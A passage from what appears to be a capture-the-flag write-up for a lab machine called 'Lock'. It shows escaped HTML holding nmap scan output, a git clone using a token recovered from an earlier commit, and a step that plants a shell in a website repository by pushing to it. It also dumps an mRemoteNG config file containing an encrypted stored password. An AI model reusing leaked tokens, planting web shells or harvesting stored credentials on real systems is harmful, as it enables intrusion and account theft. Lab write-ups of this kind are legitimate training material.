class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;theme-auto\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;meta \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;viewport\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;width=device-width, initial-scale=1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;title\u0026gt;Gitea: Git with a cup of tea\u0026lt;/title\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;link \u003cspan class=\"nv\"\u003erel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;manifest\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   HTTPOptions:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     HTTP/1.0 405 Method Not Allowed\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Allow: HEAD\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Allow: HEAD\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Allow: GET\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Set-Cookie: i_like_gitea=eccfe9ba6abb01a8; Path=/; HttpOnly; SameSite=Lax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Set-Cookie: _csrf=DF561VFH57BEAMRh7bfLXES0tyk6MTcyMTgyNjA2NDM4MTk1NTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     X-Frame-Options: SAMEORIGIN\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Date: Wed, 24 Jul 2024 13:01:04 GMT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_    Content-Length: 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e| rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   Target_Name: LOCK\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   NetBIOS_Domain_Name: LOCK\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   NetBIOS_Computer_Name: LOCK\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   DNS_Domain_Name: Lock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   DNS_Computer_Name: Lock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_  System_Time: 2024-07-24T13:02:20+00:00\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e| ssl-cert: Subject: commonName=Lock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e| Not valid before: 2024-07-23T12:57:30\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_Not valid after:  2025-01-22T12:57:30\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_ssl-date: 2024-07-24T13:03:00+00:00; -1s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_http-title: Service Unavailable\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_http-server-header: Microsoft-HTTPAPI/2.0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eWe recovered the token from previous commit and then download some repos:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.91.85:3000/ellen.freeman/website.git\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGit configuration :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit config --global user.email \u003cspan class=\"s2\"\u003e\u0026#34;you@example.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit config --global user.name \u003cspan class=\"s2\"\u003e\u0026#34;Your Name\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eWe put our shell in the website and push :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit add .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit commit -m \u003cspan class=\"s2\"\u003e\u0026#34;Your commit message\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit push\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eWe found a config.xml:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ec:\u003cspan class=\"se\"\u003e\\U\u003c/span\u003esers\u003cspan class=\"se\"\u003e\\e\u003c/span\u003ellen.freeman\u003cspan class=\"se\"\u003e\\D\u003c/span\u003eocuments\u0026gt;type config.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003etype\u003c/span\u003e config.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;?xml \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1.0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eencoding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e?\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;mrng:Connections xmlns:mrng\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://mremoteng.org\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Connections\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eExport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eEncryptionEngine\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;AES\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eBlockCipherMode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;GCM\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eKdfIterations\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1000\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eFullFileEncryption\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eProtected\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eConfVersion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;2.6\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;Node \u003cspan class=\"nv\"\u003eName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;RDP/Gale\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Connection\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eDescr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eIcon\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;mRemoteNG\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePanel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;General\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;a179606a-a854-48a6-9baa-491d8eb3bddc\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Gale.Dekarios\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eDomain\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eHostname\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Lock\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eProtocol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;RDP\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePuttySession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Default Settings\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePort\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3389\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eConnectToConsole\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eUseCredSsp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRenderingEngine\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;IE\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eICAEncryptionStrength\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;EncrBasic\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDPAuthenticationLevel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;NoAuth\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDPMinutesToIdleTimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDPAlertIdleTimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eLoadBalanceInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eColors\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Colors16Bit\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eResolution\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;FitToWindow\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eAutomaticResize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eDisplayWallpaper\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eDisplayThemes\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eEnableFontSmoothing\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eEnableDesktopComposition\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eCacheBitmaps\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRedirectDiskDrives\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRedirectPorts\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRedirectPrinters\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRedirectSmartCards\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRedirectSound\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;DoNotPlay\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSoundQuality\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Dynamic\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRedirectKeys\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eConnected\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePreExtApp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePostExtApp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eMacAddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eUserField\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eExtApp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCCompression\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CompNone\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCEncoding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;EncHextile\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCAuthMode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;AuthVNC\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCProxyType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ProxyNone\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCProxyIP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCProxyPort\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCProxyUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCProxyPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCColors\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ColNormal\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCSmartSizeMode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;SmartSAspect\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eVNCViewOnly\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDGatewayUsageMethod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Never\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDGatewayHostname\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDGatewayUseConnectionCredentials\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Yes\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDGatewayUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDGatewayPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eRDGatewayDomain\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritCacheBitmaps\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritColors\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritDescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritDisplayThemes\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritDisplayWallpaper\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritEnableFontSmoothing\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritEnableDesktopComposition\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritDomain\u003c/span\u003e\u003cspan 